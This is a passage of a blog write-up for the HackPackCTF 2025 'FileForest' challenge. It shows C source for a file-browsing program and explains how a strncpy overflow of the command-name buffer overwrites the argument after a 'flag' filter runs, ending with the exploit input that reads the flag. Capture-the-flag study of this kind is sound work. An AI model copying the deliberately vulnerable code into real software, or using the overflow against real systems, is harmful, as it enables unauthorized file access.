        <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">FOREST_READ_BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
        <span class="kt">ssize_t</span> <span class="k">const</span> <span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">read_bytes</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not read file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">read_bytes</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">file_length</span> <span class="o">+=</span> <span class="n">read_bytes</span><span class="p">;</span>

        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">read_bytes</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">++</span><span class="n">newline_count</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"File has %zd bytes and %zd newlines.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">file_length</span><span class="p">,</span> <span class="n">newline_count</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">do_help</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%-30s %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"Lists FileForest's functions and their uses"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%-30s %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"ls"</span><span class="p">,</span> <span class="s">"Lists the text files in the current directory"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%-30s %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"ls [dirname]"</span><span class="p">,</span>
            <span class="s">"Lists the text files in the directory with the given name"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%-30s %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"q"</span><span class="p">,</span> <span class="s">"Quits the program"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%-30s %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"read [filename]"</span><span class="p">,</span> <span class="s">"Reads the file with the given name"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%-30s %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"summarize [filename]"</span><span class="p">,</span> <span class="s">"Gives the number of bytes and lines in the specified file"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Ensure that written output is written promptly (useful for testing over</span>
    <span class="c1">// SSH).</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IOLBF</span><span class="p">,</span> <span class="n">BUFSIZ</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Welcome to FileForest!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">forest_state</span> <span class="n">state</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">working_dir</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">state_directory</span><span class="p">,</span> <span class="n">O_RDONLY</span> <span class="o">|</span> <span class="n">O_DIRECTORY</span><span class="p">),</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">working_dir</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open state directory: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">state_directory</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">char</span> <span class="n">command_line</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">char</span> <span class="n">command_arg</span><span class="p">[</span><span class="mi">512</span> <span class="o">-</span> <span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">char</span> <span class="n">command_name</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Fully zero inputs. Our strncpy's below will rely on this.</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">command_line</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">command_line</span><span class="p">));</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">command_arg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">command_arg</span><span class="p">));</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">command_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">command_name</span><span class="p">));</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Command: "</span><span class="p">);</span>
            <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">command_line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">command_line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Put "Command: " on its own line if we are not reading from a terminal.</span>
        <span class="c1">// (If we are reading from a terminal, then the user presses enter, which</span>
        <span class="c1">// will display the newline.)</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isatty</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="kt">size_t</span> <span class="n">command_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">command_line</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">command_len</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// If we read a newline at the end of the command, ignore it.</span>
        <span class="c1">// SAFETY: command_len != 0.</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">command_line</span><span class="p">[</span><span class="n">command_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">command_line</span><span class="p">[</span><span class="n">command_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kt">char</span><span class="o">*</span> <span class="n">arg_start</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">command_line</span><span class="p">,</span> <span class="sc">' '</span><span class="p">);</span>
        <span class="n">bool</span> <span class="n">has_arg</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">arg_start</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Add 1 to arg_start to move past space character.</span>
        <span class="c1">// Subtract 1 from length to ensure final NUL is not overwritten.</span>
        <span class="n">strncpy</span><span class="p">(</span><span class="n">command_arg</span><span class="p">,</span> <span class="n">arg_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">command_arg</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">has_arg</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">command_arg</span><span class="p">,</span> <span class="s">"flag"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Invalid argument: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">command_arg</span><span class="p">);</span>
        <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// If we have an argument, only copy until before the space.</span>
        <span class="c1">// Otherwise, copy the entire command line. Subtract one from size to ensure</span>
        <span class="c1">// we don't overwrite the final NUL.</span>
        <span class="n">strncpy</span><span class="p">(</span><span class="n">command_name</span><span class="p">,</span> <span class="n">command_line</span><span class="p">,</span>
                <span class="n">arg_start</span> <span class="o">?</span> <span class="p">(</span><span class="n">arg_start</span> <span class="o">-</span> <span class="n">command_line</span><span class="p">)</span>
                        <span class="o">:</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">command_name</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>

        <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="k">const</span> <span class="n">effective_arg</span> <span class="o">=</span> <span class="n">has_arg</span> <span class="o">?</span> <span class="n">command_arg</span> <span class="o">:</span> <span class="nb">NULL</span><span class="p">;</span>

        <span class="c1">// We know the length of the string literal, so pass it as an optimization</span>
        <span class="c1">// rather than using strcmp.</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">command_name</span><span class="p">,</span> <span class="s">"q"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Goodbye.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">command_name</span><span class="p">,</span> <span class="s">"read"</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">do_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="p">,</span> <span class="n">effective_arg</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">command_name</span><span class="p">,</span> <span class="s">"ls"</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">do_ls</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="p">,</span> <span class="n">effective_arg</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">command_name</span><span class="p">,</span> <span class="s">"summarize"</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">do_summarize</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="p">,</span> <span class="n">effective_arg</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">command_name</span><span class="p">,</span> <span class="s">"help"</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">do_help</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Unknown command: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">command_name</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Use help to see the list of valid commands</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h1 id="clues">Clues</h1><p>We can search for places where the “flag” string is giving us grief, and we find this if statement:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">command_arg</span><span class="p">,</span> <span class="s">"flag"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Invalid argument: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">command_arg</span><span class="p">);</span>
	<span class="k">continue</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>So, what can we learn about <code class="language-plaintext highlighter-rouge">command_arg</code>? Well for starters, it’s declared right near a bunch of other memory variables:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kt">char</span> <span class="n">command_line</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">char</span> <span class="n">command_arg</span><span class="p">[</span><span class="mi">512</span> <span class="o">-</span> <span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">char</span> <span class="n">command_name</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</pre></table></code></div></div><p>If you know about buffer overflows, we have a promising target. So how does the value in these variables get loaded? Well, just below, you can see they get zeroed out, but the comments confirm that this should be our target:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c1">// Fully zero inputs. Our strncpy's below will rely on this.</span>
<span class="n">memset</span><span class="p">(</span><span class="n">command_line</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">command_line</span><span class="p">));</span>
<span class="n">memset</span><span class="p">(</span><span class="n">command_arg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">command_arg</span><span class="p">));</span>
<span class="n">memset</span><span class="p">(</span><span class="n">command_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">command_name</span><span class="p">));</span>
</pre></table></code></div></div><p>While not as bad as <code class="language-plaintext highlighter-rouge">strcpy</code>, <code class="language-plaintext highlighter-rouge">strncpy</code> can still give us lots of options. In the case of this program, <code class="language-plaintext highlighter-rouge">strncpy</code> is used with a dynamic value of <code class="language-plaintext highlighter-rouge">n</code>, and even worse, it’s a value we can control since it’s the length of <code class="language-plaintext highlighter-rouge">command_name</code>:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">strncpy</span><span class="p">(</span><span class="n">command_name</span><span class="p">,</span> <span class="n">command_line</span><span class="p">,</span> <span class="n">arg_start</span> <span class="o">?</span> <span class="p">(</span><span class="n">arg_start</span> <span class="o">-</span> <span class="n">command_line</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">command_name</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
</pre></table></code></div></div><p>The above of code is vulnerable to a buffer overflow. Based on the where the memory was declared earlier, we can predict that if <code class="language-plaintext highlighter-rouge">command_name</code> is longer than 16 characters, the extra characters will begin to overwrite <code class="language-plaintext highlighter-rouge">command_arg</code>. This happens <strong>after</strong> <code class="language-plaintext highlighter-rouge">command_arg</code> is inspected for the “flag” string, so this could allow us to rewrite the file name after the check.</p><p>Because the program outputs the name of a file if it doesn’t find it, we can test what the runtime file name is:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">file</span> <span class="o">=</span> <span class="n">forest_open</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Could not open file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>So let’s test if we can add something to the command name and have things work as expected:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">read doesnotexist.txt
Could not open file: doesnotexist.txt
read0 doesnotexist.txt
Could not open file: doesnotexist.txt
read00000 doesnotexist.txt
Could not open file: doesnotexist.txt
</span></pre></table></code></div></div><p>This confirms that the command name, <code class="language-plaintext highlighter-rouge">read</code> is still parsed correctly even if we add something to it. Now we can increment the extension until something breaks. We should expect something between ten and twenty extra characters, based on the size of the</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">read000000000000000 doesnotexist.txt
Could not open file: 000snotexist.txt
</span></pre></table></code></div></div><p>Bingo! We have confirmed that a buffer overflow is possible. Now, since the string “flag” is four characters long, let’s shorten the file name to 4 characters and try to overflow the buffer. Since we got three characters to overwrite the file name in our previous try, let’s replace the last three zero’s with “fla” and add a “g”.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">read000000000000flag summ.txt
hackpackCTF{...}
</span></pre></table></code></div></div><p>Victory!</p><h1 id="solution">Solution</h1><p>Use the <code class="language-plaintext highlighter-rouge">fileforest</code> binary’s <code class="language-plaintext highlighter-rouge">read</code> command with an input that overflows the buffer so that you bypass the “flag” check but still execute <code class="language-plaintext highlighter-rouge">read flag.txt</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">read000000000000flag summ.txt
hackpackCTF{...}
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/ctf/">CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/hackpackctf/" class="post-tag no-text-decoration" >HackPackCTF</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/HackPackCTF-FileForest/">HackPackCTF 2025: FileForest</a><li class="text-truncate lh-lg"> <a href="/posts/HackPackCTF-WeAreGreenLLC/">HackPackCTF 2025: WeAreGreenLLC</a><li class="text-truncate lh-lg"> <a href="/posts/VPN-with-Custom-DNS-on-iOS-Using-Passepartout/">VPN with Custom DNS on iOS Using Passepartout</a><li class="text-truncate lh-lg"> <a href="/posts/Welcome/">Welcome</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/hackpackctf/">HackPackCTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/dns/">DNS</a> <a class="post-tag btn btn-outline-primary" href="/tags/ios/">iOS</a> <a class="post-tag btn btn-outline-primary" href="/tags/vpn/">VPN</a></div></section></div></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/HackPackCTF-WeAreGreenLLC/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1746086400" data-df="ll" > May 1, 2025 </time><h4 class="pt-0 my-2">HackPackCTF 2025: WeAreGreenLLC</h4><div class="text-muted"><p>Category: PWN Difficulty: Easy Points: 500 Below is the full source code provided for the challenge: from os import getenv import re from sys import stdout import __builtin__ import inspect ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/HackPackCTF-WeAreGreenLLC/" class="btn btn-outline-primary" aria-label="Older" ><p>HackPackCTF 2025: WeAreGreenLLC</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/wtthoma4">Taylor Thomas</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>John 3:16</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/hackpackctf/">HackPackCTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/dns/">DNS</a> <a class="post-tag btn btn-outline-primary" href="/tags/ios/">iOS</a> <a class="post-tag btn btn-outline-primary" href="/tags/vpn/">VPN</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
